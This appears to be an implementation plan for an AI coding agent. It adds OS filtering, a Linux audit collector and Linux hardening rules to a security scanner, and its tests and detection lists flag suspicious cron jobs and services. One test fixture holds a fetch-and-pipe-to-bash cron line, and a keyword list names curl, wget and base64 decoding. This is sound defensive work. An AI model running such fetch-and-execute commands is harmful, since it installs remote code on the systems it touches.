# Linux Rule Set Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement task-by-task. Steps use checkbox (`- [ ]`) syntax.

**Goal:** Adauga filtrare pe OS in motorul de reguli + un colector Linux (`linux_audit`) + ~14 reguli Linux (Lynis-style), ca scanarile pe Linux/Kali sa produca findings relevante.

**Architecture:** `@rule(os=)` + `evaluate` filtreaza pe OS-ul scanului; colectorul `linux_audit.py` (gated Linux, degradeaza fara root) aduce date specifice in `scan["linux"]`; regulile noi (functii pure) le evalueaza prin acelasi scoring/compliance.

**Tech Stack:** Python (subprocess, pathlib, platform), FastAPI rules engine, pytest.

---

## Comenzi
- Server: `cd server; $env:DISABLE_SCHEDULER="true"; $env:DISABLE_RATELIMIT="true"; .\.venv\Scripts\python.exe -m pytest tests/<f> -q --basetemp=E:\Lucrare-de-Licenta-Giurgiuveanu-Andrei\.pytmp`
- Agent: `python -m pytest agent/tests/<f> -q --basetemp=E:\Lucrare-de-Licenta-Giurgiuveanu-Andrei\.pytmp`
(Foloseste `--basetemp` ca sa eviti dir-ul temp blocat pe Windows.)

---

# FAZA 1 — Filtrare pe OS in motor

### Task 1: `@rule(os=)` + `_scan_os` + filtrare in evaluate

**Files:**
- Modify: `server/app/rules.py`
- Test: `server/tests/test_os_filter.py` (nou)

- [ ] **Step 1: Write the failing test**

```python
# server/tests/test_os_filter.py
import pytest
from server.app import rules
from server.app.rules import evaluate, _scan_os


def _linux_scan():
    return {"scan_type": "standard",
            "os": {"system": "Linux", "release": "6.5", "is_admin": False},
            "network": {"open_ports": []}, "processes": [], "software": []}


def test_scan_os_detects_linux_windows_other():
    assert _scan_os({"os": {"system": "Linux"}}) == "linux"
    assert _scan_os({"os": {"system": "Windows"}}) == "windows"
    assert _scan_os({"os": {"system": "Darwin"}}) == "other"
    assert _scan_os({}) == "other"


def test_rule_os_invalid_raises():
    with pytest.raises(ValueError):
        @rules.rule("X-BAD-1", os="bsd")
        def _bad(scan):
            return None


def test_windows_only_rule_skipped_on_linux():
    # REG-HIJACK e Windows-only → nu produce findings pe un scan Linux
    scan = _linux_scan()
    scan["scan_type"] = "deep"
    scan["persistence"] = {"registry_run": [{"name": "x", "command": "c:\\evil.exe"}]}
    _, _, findings = evaluate(scan)
    assert not any(f["rule_id"] == "REG-HIJACK-1" for f in findings)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `...pytest tests/test_os_filter.py -q`
Expected: FAIL — `_scan_os` inexistent / `os=` kwarg nesuportat.

- [ ] **Step 3: Add `os` param to decorator + `_scan_os` + filter**

In `rules.py`, extinde `rule(...)`:
```python
def rule(
    rule_id: str,
    min_level: str = "standard",
    category: str = "hygiene",
    weight: float = 1.0,
    confidence: float = 1.0,
    compliance: list[str] | None = None,
    os: str = "any",
) -> Callable[[RuleFn], RuleFn]:
```
Dupa validarea weight, adauga:
```python
    if os not in ("any", "windows", "linux"):
        raise ValueError(f"os invalid: {os!r}, asteptat any|windows|linux")
```
In `decorator`, dupa `fn._compliance = ...`:
```python
        fn._os = os  # type: ignore[attr-defined]
```

Adauga helper (langa evaluate):
```python
def _scan_os(scan: dict) -> str:
    system = str((scan.get("os") or {}).get("system", "")).lower()
    if system.startswith("linux"):
        return "linux"
    if system.startswith("windows"):
        return "windows"
    return "other"
```

In `evaluate`, dupa `level = ...`:
```python
    scan_os = _scan_os(scan)
```
In bucla, dupa filtrul min_level:
```python
        rule_os = getattr(fn, "_os", "any")
        if rule_os != "any" and rule_os != scan_os:
            continue
```

- [ ] **Step 4: Run test to verify it passes**

Run: `...pytest tests/test_os_filter.py -q`
Expected: PASS (3) — DAR `test_windows_only_rule_skipped_on_linux` poate trece deja
daca REG-HIJACK nu fireaza pe payload-ul minimal; il facem definitiv in Task 2 cand
tag-uim REG-HIJACK ca `os="windows"`. Daca trece acum, OK; daca nu, continua la Task 2.

- [ ] **Step 5: Commit**

```bash
git add server/app/rules.py server/tests/test_os_filter.py
git commit -m "feat(rules): @rule(os=) + filtrare pe OS in evaluate"
```

---

### Task 2: Tag reguli Windows-only cu `os="windows"`

**Files:** Modify `server/app/rules.py` (decoratoarele celor 15 reguli)

- [ ] **Step 1: Adauga `os="windows"`** la decoratoarele acestor reguli (cele care
depind de date Windows-only). Pentru fiecare, adauga `, os="windows"` in `@rule(...)`:

`REG-HIJACK-1`, `WMI-PERSIST-1`, `AV-DISABLED-1`, `BITLOCKER-OFF-1`,
`EVENTLOG-BRUTEFORCE-1`, `EVENTLOG-PRIVESC-1`, `STARTUP-SUSPICIOUS-1`,
`TASK-SUSPICIOUS-1`, `SVC-SUSPICIOUS-1`, `PS-POLICY-1`, `NET-SHARE-1`,
`FW-DISABLED-1`, `USER-ADMIN-1`, `CERT-UNTRUSTED-1`, `HOSTS-TAMPERED-1`.

Exemplu (cauta decoratorul existent si adauga `os="windows"`):
```python
@rule("REG-HIJACK-1", min_level="deep", category="critical_risk", weight=2.0,
      compliance=["CIS-10.5", "NIST-PR.IP-1"], os="windows")
```
(NU atinge: NET-OPEN-PORTS-1, NET-MANY-PORTS-2, NET-ESTABLISHED-1, OS-ADMIN-1,
PROC-SUSPICIOUS-1, PROC-POWERSHELL-2, SW-VULNERABLE-1, OS-EOL-1, NMAP-LUA-1 — raman `any`.)

- [ ] **Step 2: Run all server rule tests**

Run: `...pytest tests/test_rules.py tests/test_new_rules.py tests/test_rule_fp_fixes.py tests/test_os_filter.py -q`
Expected: PASS — testele existente trimit payload-uri Windows (`os.system="Windows"`),
deci regulile `os="windows"` fireaza in continuare la fel.

- [ ] **Step 3: Commit**

```bash
git add server/app/rules.py
git commit -m "feat(rules): tag 15 reguli ca os=windows (nu se aprind pe Linux)"
```

---

# FAZA 2 — Colector Linux

### Task 3: ScanProfile flags pentru Linux audit

**Files:** Modify `agent/core.py` (`ScanProfile` dataclass + `SCAN_PROFILES`)

- [ ] **Step 1: Adauga flag-uri** in `ScanProfile` (langa flag-urile Deep), cu default False:
```python
    # Linux audit
    include_linux_basic: bool = False     # ssh, firewall, users, kernel, sysctl, packages
    include_linux_jobs: bool = False      # cron, services (advanced+)
    include_linux_files: bool = False     # suid, world-writable (deep, lente)
```

- [ ] **Step 2: Seteaza flag-urile** in `SCAN_PROFILES`:
- `standard`: `include_linux_basic=True`
- `advanced`: `include_linux_basic=True, include_linux_jobs=True`
- `deep`: `include_linux_basic=True, include_linux_jobs=True, include_linux_files=True`

- [ ] **Step 3: Commit**

```bash
git add agent/core.py
git commit -m "feat(agent): ScanProfile flags pentru Linux audit (basic/jobs/files)"
```

---

### Task 4: Colectorul `linux_audit.py` + teste

**Files:**
- Create: `agent/collectors/linux_audit.py`
- Test: `agent/tests/test_linux_audit.py`
- Modify: `agent/collectors/__init__.py` (export) + `agent/core.py` (`collect_system_data` apel)

- [ ] **Step 1: Write the failing test**

```python
# agent/tests/test_linux_audit.py
import builtins
import io
from agent.collectors import linux_audit as la


def test_non_linux_returns_empty(monkeypatch):
    monkeypatch.setattr(la.platform, "system", lambda: "Windows")
    from agent.core import SCAN_PROFILES
    assert la.collect_linux_audit(SCAN_PROFILES["deep"]) == {}


def test_parse_sshd_config():
    text = "PermitRootLogin yes\n#Port 22\nPasswordAuthentication no\nPort 2222\n"
    out = la._parse_sshd_config(text)
    assert out["permit_root_login"] == "yes"
    assert out["password_auth"] == "no"
    assert out["port"] == 2222


def test_parse_uid0_accounts():
    passwd = "root:x:0:0:root:/root:/bin/bash\nbob:x:0:0::/home/bob:/bin/sh\nu:x:1000:1000::/home/u:/bin/sh\n"
    assert la._uid0_accounts(passwd) == ["root", "bob"]


def test_parse_sysctl():
    out = la._parse_sysctl("net.ipv4.ip_forward = 1\nkernel.randomize_va_space = 2\n")
    assert out["ip_forward"] == "1"
    assert out["aslr"] == "2"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest agent/tests/test_linux_audit.py -q`
Expected: FAIL — modul inexistent.

- [ ] **Step 3: Implement `linux_audit.py`**

```python
"""Colector specific Linux (gated). Degradeaza gratios fara root: ce nu e
citibil → camp gol. Surse: fisiere /etc + comenzi (ufw/iptables/sysctl/dpkg...)."""
from __future__ import annotations

import platform
import re
import subprocess
from pathlib import Path

from agent.core import ScanProfile

# Binare SUID standard (known-good) — orice in afara listei e flagat.
KNOWN_SUID = {
    "sudo", "su", "passwd", "chsh", "chfn", "newgrp", "gpasswd", "mount",
    "umount", "ping", "ping6", "fusermount", "fusermount3", "pkexec",
    "ssh-keysign", "dbus-daemon-launch-helper", "polkit-agent-helper-1",
    "chrome-sandbox", "snap-confine", "unix_chkpwd",
}
SENSITIVE_DIRS = ("/etc", "/usr/local/bin", "/usr/local/sbin")
SUID_DIRS = ("/usr/bin", "/usr/sbin", "/bin", "/sbin")
CRON_PATHS = ("/etc/crontab",)
CRON_DIRS = ("/etc/cron.d",)
SVC_BAD_PATHS = ("/tmp/", "/home/", "/dev/shm/", "/var/tmp/")


def _run(cmd: list[str], timeout: int = 15) -> str:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout or ""
    except (subprocess.SubprocessError, OSError):
        return ""


def _read(path: str) -> str:
    try:
        return Path(path).read_text(encoding="utf-8", errors="replace")
    except OSError:
        return ""


def _parse_sshd_config(text: str) -> dict:
    out = {"permit_root_login": None, "password_auth": None, "port": None}
    for line in text.splitlines():
        s = line.strip()
        if not s or s.startswith("#"):
            continue
        parts = s.split(None, 1)
        if len(parts) != 2:
            continue
        key, val = parts[0].lower(), parts[1].strip()
        if key == "permitrootlogin":
            out["permit_root_login"] = val.lower()
        elif key == "passwordauthentication":
            out["password_auth"] = val.lower()
        elif key == "port":
            try:
                out["port"] = int(val.split()[0])
            except ValueError:
                pass
    return out


def _uid0_accounts(passwd_text: str) -> list[str]:
    out = []
    for line in passwd_text.splitlines():
        f = line.split(":")
        if len(f) >= 3 and f[2] == "0":
            out.append(f[0])
    return out


def _empty_password_accounts(shadow_text: str) -> list[str]:
    out = []
    for line in shadow_text.splitlines():
        f = line.split(":")
        if len(f) >= 2 and f[1] == "":
            out.append(f[0])
    return out


def _parse_sysctl(text: str) -> dict:
    vals = {}
    for line in text.splitlines():
        if "=" in line:
            k, v = line.split("=", 1)
            vals[k.strip()] = v.strip()
    return {
        "ip_forward": vals.get("net.ipv4.ip_forward"),
        "aslr": vals.get("kernel.randomize_va_space"),
    }


def _firewall() -> dict:
    import shutil
    if shutil.which("ufw"):
        out = _run(["ufw", "status"])
        return {"tool": "ufw", "active": "status: active" in out.lower()}
    if shutil.which("iptables"):
        out = _run(["iptables", "-S"])
        # active daca exista politici/reguli dincolo de default ACCEPT
        active = any(l.startswith("-A") for l in out.splitlines())
        return {"tool": "iptables", "active": active}
    if shutil.which("nft"):
        out = _run(["nft", "list", "ruleset"])
        return {"tool": "nftables", "active": bool(out.strip())}
    return {"tool": "none", "active": False}


def _suid_binaries() -> list[str]:
    out = []
    for d in SUID_DIRS:
        res = _run(["find", d, "-maxdepth", "1", "-perm", "-4000", "-type", "f"], timeout=20)
        for path in res.splitlines():
            name = path.rsplit("/", 1)[-1]
            if name and name not in KNOWN_SUID:
                out.append(path)
    return out[:200]


def _world_writable() -> list[str]:
    out = []
    for d in SENSITIVE_DIRS:
        res = _run(["find", d, "-maxdepth", "2", "-perm", "-0002", "-type", "f"], timeout=20)
        out.extend(p for p in res.splitlines() if p)
    return out[:200]


def _cron() -> list[dict]:
    out = []
    for p in CRON_PATHS:
        for line in _read(p).splitlines():
            s = line.strip()
            if s and not s.startswith("#"):
                out.append({"source": p, "line": s})
    for d in CRON_DIRS:
        try:
            for f in Path(d).iterdir():
                for line in _read(str(f)).splitlines():
                    s = line.strip()
                    if s and not s.startswith("#"):
                        out.append({"source": str(f), "line": s})
        except OSError:
            pass
    return out[:200]


def _services() -> list[dict]:
    out = []
    res = _run(["systemctl", "list-units", "--type=service", "--all", "--no-legend", "--plain"])
    names = [l.split()[0] for l in res.splitlines() if l.strip() and l.split()[0].endswith(".service")]
    for name in names[:300]:
        show = _run(["systemctl", "show", "-p", "ExecStart", name])
        m = re.search(r"path=([^\s;]+)", show)
        exec_path = m.group(1) if m else ""
        if exec_path:
            out.append({"name": name, "exec": exec_path})
    return out


def _packages() -> list[dict]:
    import shutil
    out = []
    if shutil.which("dpkg-query"):
        res = _run(["dpkg-query", "-W", "-f=${Package} ${Version}\n"])
        for line in res.splitlines():
            p = line.split(None, 1)
            if len(p) == 2:
                out.append({"name": p[0], "version": p[1]})
    elif shutil.which("rpm"):
        res = _run(["rpm", "-qa", "--qf", "%{NAME} %{VERSION}\n"])
        for line in res.splitlines():
            p = line.split(None, 1)
            if len(p) == 2:
                out.append({"name": p[0], "version": p[1]})
    return out[:2000]


def _sudo_nopasswd() -> list[str]:
    out = []
    text = _read("/etc/sudoers")
    try:
        for f in Path("/etc/sudoers.d").iterdir():
            text += "\n" + _read(str(f))
    except OSError:
        pass
    for line in text.splitlines():
        s = line.strip()
        if s and not s.startswith("#") and "NOPASSWD" in s:
            out.append(s)
    return out


def collect_linux_audit(cfg: ScanProfile) -> dict:
    if platform.system() != "Linux":
        return {}
    data: dict = {}
    if cfg.include_linux_basic:
        data["ssh"] = _parse_sshd_config(_read("/etc/ssh/sshd_config"))
        data["firewall"] = _firewall()
        data["users"] = {
            "uid0_accounts": _uid0_accounts(_read("/etc/passwd")),
            "empty_password_accounts": _empty_password_accounts(_read("/etc/shadow")),
            "sudo_nopasswd": _sudo_nopasswd(),
        }
        data["kernel"] = platform.release()
        data["sysctl"] = _parse_sysctl(
            _run(["sysctl", "net.ipv4.ip_forward", "kernel.randomize_va_space"]))
        data["packages"] = _packages()
        au = _run(["systemctl", "is-enabled", "unattended-upgrades"]).strip()
        data["auto_updates"] = (au == "enabled") if au else None
    if cfg.include_linux_jobs:
        data["cron"] = _cron()
        data["services"] = _services()
    if cfg.include_linux_files:
        data["suid"] = _suid_binaries()
        data["world_writable"] = _world_writable()
    return data
```

- [ ] **Step 4: Export + integrare in collect_system_data**

In `agent/collectors/__init__.py`, adauga:
```python
from .linux_audit import collect_linux_audit  # noqa: F401
```
In `agent/core.py` `collect_system_data`, dupa colectarea forensics (inainte de
`step(... "Finalizare")`), adauga:
```python
    linux = collectors.collect_linux_audit(cfg)
```
si include `linux` in dict-ul returnat (cheia `"linux": linux`).

- [ ] **Step 5: Run tests**

Run: `python -m pytest agent/tests/test_linux_audit.py -q --basetemp=E:\Lucrare-de-Licenta-Giurgiuveanu-Andrei\.pytmp`
Expected: PASS (4)

- [ ] **Step 6: Commit**

```bash
git add agent/collectors/linux_audit.py agent/tests/test_linux_audit.py agent/collectors/__init__.py agent/core.py
git commit -m "feat(agent): colector linux_audit (ssh/fw/useri/suid/cron/sysctl/pkg) gated Linux"
```

---

# FAZA 3 — Reguli Linux

### Task 5: Reguli Linux critical_risk + network_exposure

**Files:** Modify `server/app/rules.py`; Test `server/tests/test_linux_rules.py` (nou)

- [ ] **Step 1: Write the failing test**

```python
# server/tests/test_linux_rules.py
from server.app.rules import evaluate


def _lscan(linux: dict, scan_type="deep"):
    return {"scan_type": scan_type,
            "os": {"system": "Linux", "release": "6.5", "is_admin": False},
            "network": {"open_ports": []}, "processes": [], "software": [],
            "linux": linux}


def _ids(findings):
    return {f["rule_id"] for f in findings}


def test_ssh_root_login():
    _, _, f = evaluate(_lscan({"ssh": {"permit_root_login": "yes", "password_auth": "no", "port": 22}}))
    assert "LNX-SSH-ROOT-LOGIN-1" in _ids(f)


def test_uid0_extra():
    _, _, f = evaluate(_lscan({"users": {"uid0_accounts": ["root", "bob"], "empty_password_accounts": [], "sudo_nopasswd": []}}))
    assert "LNX-UID0-1" in _ids(f)


def test_empty_password():
    _, _, f = evaluate(_lscan({"users": {"uid0_accounts": ["root"], "empty_password_accounts": ["guest"], "sudo_nopasswd": []}}))
    assert "LNX-EMPTY-PASSWD-1" in _ids(f)


def test_firewall_disabled():
    _, _, f = evaluate(_lscan({"firewall": {"tool": "ufw", "active": False}}))
    assert "LNX-FW-DISABLED-1" in _ids(f)


def test_suid_uncommon():
    _, _, f = evaluate(_lscan({"suid": ["/usr/bin/weird"]}))
    assert "LNX-SUID-UNCOMMON-1" in _ids(f)


def test_clean_linux_no_linux_findings():
    _, _, f = evaluate(_lscan({"ssh": {"permit_root_login": "no", "password_auth": "no", "port": 22},
                               "firewall": {"tool": "ufw", "active": True},
                               "users": {"uid0_accounts": ["root"], "empty_password_accounts": [], "sudo_nopasswd": []}}))
    assert not any(i.startswith("LNX-") for i in _ids(f))
```

- [ ] **Step 2: Run test to verify it fails**

Run: `...pytest tests/test_linux_rules.py -q`
Expected: FAIL — reguli inexistente.

- [ ] **Step 3: Implement rules** (adauga la finalul `rules.py`, sectiune noua)

```python
# ─────────────────────────────────────────────────────────────────────────────
# REGULI LINUX (os="linux")
# ─────────────────────────────────────────────────────────────────────────────

def _lx(scan):
    return scan.get("linux") or {}


@rule("LNX-SSH-ROOT-LOGIN-1", min_level="standard", category="critical_risk",
      weight=1.5, compliance=["CIS-5.2.8", "NIST-PR.AC-4"], os="linux")
def rule_ssh_root_login(scan):
    if (_lx(scan).get("ssh") or {}).get("permit_root_login") == "yes":
        return {"rule_id": "LNX-SSH-ROOT-LOGIN-1", "severity": "high",
                "title": "SSH permite login direct ca root (PermitRootLogin yes)",
                "evidence": {"PermitRootLogin": "yes"},
                "recommendation": "Seteaza PermitRootLogin no (sau prohibit-password) in /etc/ssh/sshd_config."}
    return None


@rule("LNX-EMPTY-PASSWD-1", min_level="standard", category="critical_risk",
      weight=2.0, compliance=["CIS-5.4.2", "NIST-PR.AC-1"], os="linux")
def rule_empty_password(scan):
    accts = (_lx(scan).get("users") or {}).get("empty_password_accounts") or []
    if accts:
        return {"rule_id": "LNX-EMPTY-PASSWD-1", "severity": "critical",
                "title": f"Conturi cu parola goala: {', '.join(accts[:5])}",
                "evidence": {"accounts": accts[:20]},
                "recommendation": "Seteaza parole sau dezactiveaza conturile (passwd -l)."}
    return None


@rule("LNX-UID0-1", min_level="standard", category="critical_risk",
      weight=2.0, compliance=["CIS-5.4.2", "NIST-PR.AC-4"], os="linux")
def rule_uid0(scan):
    accts = (_lx(scan).get("users") or {}).get("uid0_accounts") or []
    extra = [a for a in accts if a != "root"]
    if extra:
        return {"rule_id": "LNX-UID0-1", "severity": "critical",
                "title": f"Conturi non-root cu UID 0: {', '.join(extra[:5])}",
                "evidence": {"accounts": extra},
                "recommendation": "Doar root ar trebui sa aiba UID 0. Investigheaza/remediaza."}
    return None


@rule("LNX-PKG-VULNERABLE-1", min_level="standard", category="critical_risk",
      weight=1.5, compliance=["CIS-1.9", "NIST-ID.RA-1"], os="linux")
def rule_pkg_vulnerable(scan):
    pkgs = _lx(scan).get("packages") or []
    names = [f"{p.get('name','')} {p.get('version','')}" for p in pkgs]
    out = []
    for r in VULNERABLE_SOFTWARE:
        for n in names:
            if r["name_contains"].lower() in n.lower():
                out.append({"rule_id": "LNX-PKG-VULNERABLE-1", "severity": r["severity"],
                            "title": f"Pachet vulnerabil: {n[:60]}",
                            "evidence": {"package": n, "cve": r["cve"], "note": r["note"]},
                            "recommendation": "Actualizeaza pachetul (apt upgrade) sau elimina-l."})
    return out or None


@rule("LNX-SUID-UNCOMMON-1", min_level="deep", category="critical_risk",
      weight=1.2, confidence=0.7, compliance=["CIS-6.1", "NIST-PR.AC-6"], os="linux")
def rule_suid_uncommon(scan):
    suid = _lx(scan).get("suid") or []
    if suid:
        return {"rule_id": "LNX-SUID-UNCOMMON-1", "severity": "high",
                "title": f"Binare SUID neobisnuite: {len(suid)}",
                "evidence": {"binaries": suid[:30]},
                "recommendation": "Verifica binarele SUID neasteptate — pot fi vector de privilege escalation."}
    return None


@rule("LNX-FW-DISABLED-1", min_level="standard", category="network_exposure",
      weight=1.2, compliance=["CIS-3.5", "NIST-PR.AC-5"], os="linux")
def rule_fw_disabled(scan):
    fw = _lx(scan).get("firewall") or {}
    if fw and fw.get("active") is False:
        return {"rule_id": "LNX-FW-DISABLED-1", "severity": "high",
                "title": f"Firewall inactiv ({fw.get('tool', 'necunoscut')})",
                "evidence": {"tool": fw.get("tool"), "active": False},
                "recommendation": "Activeaza firewall-ul (ex: ufw enable) si restrictioneaza inbound."}
    return None


@rule("LNX-SSH-PASSWORD-AUTH-1", min_level="standard", category="network_exposure",
      compliance=["CIS-5.2.10", "NIST-PR.AC-7"], os="linux")
def rule_ssh_password_auth(scan):
    if (_lx(scan).get("ssh") or {}).get("password_auth") == "yes":
        return {"rule_id": "LNX-SSH-PASSWORD-AUTH-1", "severity": "medium",
                "title": "SSH accepta autentificare cu parola (suprafata brute-force)",
                "evidence": {"PasswordAuthentication": "yes"},
                "recommendation": "Prefera chei SSH: PasswordAuthentication no."}
    return None
```

- [ ] **Step 4: Run test to verify it passes**

Run: `...pytest tests/test_linux_rules.py -q`
Expected: PASS (toate cele din Task 5; cele hygiene/activity vin in Task 6).

- [ ] **Step 5: Commit**

```bash
git add server/app/rules.py server/tests/test_linux_rules.py
git commit -m "feat(rules): reguli Linux critical_risk + network (ssh/uid0/empty-pass/fw/suid/pkg)"
```

---

### Task 6: Reguli Linux hygiene + activity

**Files:** Modify `server/app/rules.py`; Test `server/tests/test_linux_rules.py`

- [ ] **Step 1: Write the failing test** (adauga in test_linux_rules.py)

```python
def test_sudo_nopasswd():
    _, _, f = evaluate(_lscan({"users": {"uid0_accounts": ["root"], "empty_password_accounts": [], "sudo_nopasswd": ["bob ALL=(ALL) NOPASSWD: ALL"]}}))
    assert "LNX-SUDO-NOPASSWD-1" in _ids(f)


def test_world_writable():
    _, _, f = evaluate(_lscan({"world_writable": ["/etc/cron.allow"]}))
    assert "LNX-WORLD-WRITABLE-1" in _ids(f)


def test_sysctl_ipfwd_and_aslr():
    _, _, f = evaluate(_lscan({"sysctl": {"ip_forward": "1", "aslr": "0"}}))
    ids = _ids(f)
    assert "LNX-SYSCTL-IPFWD-1" in ids
    assert "LNX-ASLR-WEAK-1" in ids


def test_cron_suspicious():
    _, _, f = evaluate(_lscan({"cron": [{"source": "/etc/crontab", "line": "* * * * * root curl http://x|bash"}]}))
    assert "LNX-CRON-SUSPICIOUS-1" in _ids(f)


def test_service_suspicious():
    _, _, f = evaluate(_lscan({"services": [{"name": "evil.service", "exec": "/tmp/evil"}]}))
    assert "LNX-SVC-SUSPICIOUS-1" in _ids(f)


def test_autoupdate_off():
    _, _, f = evaluate(_lscan({"auto_updates": False}))
    assert "LNX-AUTOUPDATE-OFF-1" in _ids(f)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `...pytest tests/test_linux_rules.py -q`
Expected: FAIL — reguli noi inexistente.

- [ ] **Step 3: Implement rules** (adauga dupa cele din Task 5)

```python
@rule("LNX-SUDO-NOPASSWD-1", min_level="standard", category="hygiene",
      compliance=["CIS-5.3.4", "NIST-PR.AC-4"], os="linux")
def rule_sudo_nopasswd(scan):
    entries = (_lx(scan).get("users") or {}).get("sudo_nopasswd") or []
    if entries:
        return {"rule_id": "LNX-SUDO-NOPASSWD-1", "severity": "medium",
                "title": "Reguli sudo NOPASSWD (escaladare fara parola)",
                "evidence": {"entries": entries[:10]},
                "recommendation": "Elimina NOPASSWD din sudoers acolo unde nu e strict necesar."}
    return None


@rule("LNX-WORLD-WRITABLE-1", min_level="deep", category="hygiene",
      confidence=0.8, compliance=["CIS-1.1", "NIST-PR.AC-4"], os="linux")
def rule_world_writable(scan):
    ww = _lx(scan).get("world_writable") or []
    if ww:
        return {"rule_id": "LNX-WORLD-WRITABLE-1", "severity": "medium",
                "title": f"Fisiere world-writable in zone sensibile: {len(ww)}",
                "evidence": {"files": ww[:30]},
                "recommendation": "Restrictioneaza permisiunile (chmod o-w) pe fisierele world-writable."}
    return None


@rule("LNX-SYSCTL-IPFWD-1", min_level="standard", category="hygiene",
      confidence=0.7, compliance=["CIS-3.1", "NIST-PR.PT-4"], os="linux")
def rule_sysctl_ipfwd(scan):
    if (_lx(scan).get("sysctl") or {}).get("ip_forward") == "1":
        return {"rule_id": "LNX-SYSCTL-IPFWD-1", "severity": "low",
                "title": "IP forwarding activ (net.ipv4.ip_forward=1)",
                "evidence": {"ip_forward": "1"},
                "recommendation": "Dezactiveaza daca masina nu e router/gateway: sysctl -w net.ipv4.ip_forward=0."}
    return None


@rule("LNX-ASLR-WEAK-1", min_level="standard", category="hygiene",
      compliance=["CIS-1.5.3", "NIST-PR.IP-1"], os="linux")
def rule_aslr_weak(scan):
    aslr = (_lx(scan).get("sysctl") or {}).get("aslr")
    if aslr is not None and aslr in ("0", "1"):
        return {"rule_id": "LNX-ASLR-WEAK-1", "severity": "medium",
                "title": f"ASLR slabit (kernel.randomize_va_space={aslr})",
                "evidence": {"randomize_va_space": aslr},
                "recommendation": "Seteaza kernel.randomize_va_space=2 pentru ASLR complet."}
    return None


@rule("LNX-AUTOUPDATE-OFF-1", min_level="standard", category="hygiene",
      compliance=["CIS-1.9", "NIST-PR.IP-12"], os="linux")
def rule_autoupdate_off(scan):
    if _lx(scan).get("auto_updates") is False:
        return {"rule_id": "LNX-AUTOUPDATE-OFF-1", "severity": "low",
                "title": "Actualizari automate dezactivate (unattended-upgrades)",
                "evidence": {"auto_updates": False},
                "recommendation": "Activeaza unattended-upgrades pentru patch-uri de securitate automate."}
    return None


_CRON_BAD = ("curl", "wget", "|bash", "| bash", "/tmp/", "base64 -d", "/dev/shm")


@rule("LNX-CRON-SUSPICIOUS-1", min_level="advanced", category="activity",
      confidence=0.8, compliance=["CIS-5.1", "NIST-DE.CM-1"], os="linux")
def rule_cron_suspicious(scan):
    out = []
    for entry in _lx(scan).get("cron") or []:
        line = (entry.get("line") or "").lower()
        if any(p in line for p in _CRON_BAD):
            out.append({"rule_id": "LNX-CRON-SUSPICIOUS-1", "severity": "high",
                        "title": "Cron job suspect (download/exec)",
                        "evidence": {"source": entry.get("source"), "line": entry.get("line", "")[:200]},
                        "recommendation": "Verifica job-ul cron — pattern tipic de persistenta/malware."})
    return out or None


@rule("LNX-SVC-SUSPICIOUS-1", min_level="advanced", category="activity",
      weight=0.8, compliance=["CIS-2.1", "NIST-DE.CM-1"], os="linux")
def rule_svc_suspicious(scan):
    out = []
    for svc in _lx(scan).get("services") or []:
        exec_path = (svc.get("exec") or "").lower()
        if any(exec_path.startswith(b) or b in exec_path for b in ("/tmp/", "/home/", "/dev/shm/", "/var/tmp/")):
            out.append({"rule_id": "LNX-SVC-SUSPICIOUS-1", "severity": "high",
                        "title": f"Serviciu systemd din cale neobisnuita: {svc.get('name')}",
                        "evidence": {"name": svc.get("name"), "exec": svc.get("exec")},
                        "recommendation": "Serviciile legitime nu ruleaza din /tmp,/home,/dev/shm. Investigheaza."})
    return out or None
```

- [ ] **Step 4: Run test to verify it passes**

Run: `...pytest tests/test_linux_rules.py -q`
Expected: PASS (toate ~12 teste).

- [ ] **Step 5: Commit**

```bash
git add server/app/rules.py server/tests/test_linux_rules.py
git commit -m "feat(rules): reguli Linux hygiene + activity (sudo/world-writable/sysctl/cron/svc/autoupdate)"
```

---

# FAZA 4 — Finalizare

### Task 7: Suita completa + memory.md + rebuild .exe

**Files:** memory.md: `server/app/memory.md`, `server/tests/memory.md`,
`agent/collectors/memory.md`, `agent/tests/memory.md`, root `CLAUDE.md` (rule count)

- [ ] **Step 1: Ruleaza tot**

Server: `cd server; $env:DISABLE_SCHEDULER="true"; $env:DISABLE_RATELIMIT="true"; .\.venv\Scripts\python.exe -m pytest -q --basetemp=E:\Lucrare-de-Licenta-Giurgiuveanu-Andrei\.pytmp`
Agent: `python -m pytest agent/tests -q --basetemp=E:\Lucrare-de-Licenta-Giurgiuveanu-Andrei\.pytmp`
Expected: toate verzi.

- [ ] **Step 2: Update memory.md** — `rules.py`: `@rule(os=)` + reguli Linux (~14)
+ tag os=windows pe cele 15. `collectors/memory.md`: `linux_audit.py`. Test memory-uri:
test_os_filter, test_linux_rules, test_linux_audit. `CLAUDE.md`: noteaza setul Linux
+ filtrarea pe OS.

- [ ] **Step 3: Rebuild .exe** (agentul s-a schimbat — colector nou)

`& .\.venv-build\Scripts\python.exe -m PyInstaller --clean --noconfirm .\agent\VulnWatchAgent.spec`
+ copy in `server/app/static/agent/VulnWatchAgent.exe`.
(Adauga `agent.collectors.linux_audit` la hiddenimports din spec daca PyInstaller nu-l ridica.)

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "docs: memory.md set reguli Linux + filtrare OS; rebuild .exe"
```

- [ ] **Step 5: Verificare live pe Kali**

Pe Kali: `git pull`, re-ruleaza agentul, scaneaza (advanced/deep). Acum ar trebui sa
apara findings Linux (ssh/firewall/sysctl/etc.) in functie de configuratia masinii.

---

## Self-Review

**Spec coverage:** A (OS filter)→Task 1,2 | B (colector)→Task 3,4 | C (reguli:
critical/network→T5, hygiene/activity→T6)→Task 5,6 | D (scoring/compliance: refs CIS/NIST
pe fiecare regula) ✓ | E (testare: test_os_filter, test_linux_audit, test_linux_rules) ✓
| F (faze)→Task 1-7. Toate acoperite. ✓
**Placeholders:** cod real in fiecare step; fara TBD. ✓
**Type consistency:** `_scan_os`, `fn._os`, `collect_linux_audit(cfg)`, `_lx(scan)`,
cheile `scan["linux"]` (ssh/firewall/users/suid/cron/services/packages/kernel/sysctl/
auto_updates/world_writable) folosite identic intre colector, teste si reguli.
Sub-functii colector (`_parse_sshd_config`, `_uid0_accounts`, `_empty_password_accounts`,
`_parse_sysctl`, `_firewall`, `_suid_binaries`, `_world_writable`, `_cron`, `_services`,
`_packages`, `_sudo_nopasswd`) consistente intre impl + teste. ✓
**Reguli count:** 14 reguli Linux (5 critical, 2 network → wait: ssh-root, empty-pass,
